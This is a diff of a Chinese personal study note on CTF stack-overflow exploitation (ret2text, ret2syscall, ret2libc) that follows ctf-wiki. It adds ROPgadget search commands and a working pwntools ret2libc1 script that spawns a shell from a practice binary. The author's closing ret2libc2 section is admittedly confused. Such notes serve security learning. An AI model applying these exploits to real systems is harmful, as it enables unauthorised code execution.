@@ -2,6 +2,8 @@
 
 计划是先跟着ctf-wiki走，期间也做做攻防世界的初始题。
 
+[TOC]
+
 ## 栈溢出
 
 ​       栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：
@@ -14,7 +16,7 @@
 
 ### 基本ROP
 
-#### 栈溢出example
+#### 1、栈溢出example
 
 ```C
 #include <stdio.h>
@@ -77,9 +79,9 @@ sh.interactive()
 
 
 
-#### ret2text
+#### 2、ret2text
 
-ret2text 即控制程序执行程序本身已有的的代码 (即， `.text` 段中的代码) 。
+ret2text 即控制程序执行程序本身已有的的代码 (即`.text`段中的代码) 。
 
 main函数中的gets是危险函数
 
@@ -123,7 +125,7 @@ sh.interactive()
 
 
 
-#### ret2shellcode
+#### 3、ret2shellcode
 
 ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。**通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码**。
 
@@ -166,7 +168,7 @@ sh.interactive()
 
 
 
-#### ret2syscall
+#### 4、ret2syscall
 
 ret2syscall，即控制程序执行系统调用，获取 shell。
 
@@ -195,6 +197,14 @@ https://github.com/JonathanSalwan/ROPgadget
 
 先压地址再压参数。
 
+```
+ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
+ROPgadget --binary rop  --string '/bin/sh' 
+ROPgadget --binary rop  --only 'int'                 
+```
+
+
+
 ![image-20240521145256497](./pwn.assets/image-20240521145256497.png)
 
 ![image-20240521145418148](./pwn.assets/image-20240521145418148.png)
@@ -218,4 +228,63 @@ payload = flat(
 sh.sendline(payload)
 sh.interactive()
 ```
+
+![image-20240521155253674](./pwn.assets/image-20240521155253674.png)
+
+
+
+#### 5、ret2libc1
+
+![image-20240522163348805](./pwn.assets/image-20240522163348805.png)
+
+有/bin/sh存在
+
+![image-20240522163924446](./pwn.assets/image-20240522163924446.png)
+
+在ghidra的import表中发现system
+
+![image-20240522164500062](./pwn.assets/image-20240522164500062.png)
+
+事实上这里system的地址是错的，抱着试试的心态把CTF wiki上的地址0x08048460填进去发现还对了，什么刻舟求剑。
+
+OK，发现地址实际是在注释的XREF交叉引用里。
+
+![image-20240522172741078](./pwn.assets/image-20240522172741078.png)
+
+![image-20240522172713226](./pwn.assets/image-20240522172713226.png)
+
+```python
+##coding=utf8
+from pwn import *
+## 构造与程序交互的对象
+sh = process('./ret2libc1')
+binsh_addr = 0x8048720
+system_addr = 0x8048460
+## 构造payload
+payload = flat([b'a' * 112, system_addr, b'b' * 4, binsh_addr])
+## 向程序发送字符串
+sh.sendline(payload)
+## 将代码交互转换为手工交互
+sh.interactive()
+```
+
+
+
+#### 6、ret2libc2
+
+![image-20240522173606508](./pwn.assets/image-20240522173606508.png)
+
+相比于上题，这次没有直接搜到字符串sh的位置，system位置在0x8048490
+
+![image-20240522174058921](./pwn.assets/image-20240522174058921.png)
+
+我的想法是把/bin/bash字符串写入栈中，把原地址换成/bin/bash写入的地址即可。（猜错了好像
+
+这段完全没理清楚
+
+![image-20240522181132772](./pwn.assets/image-20240522181132772.png)
+
+据ctfwiki，ret到了gets的位置，但后面的pop_ebx，包括buf2没有理解这是想干嘛（
+
+![image-20240522181706475](./pwn.assets/image-20240522181706475.png)
 
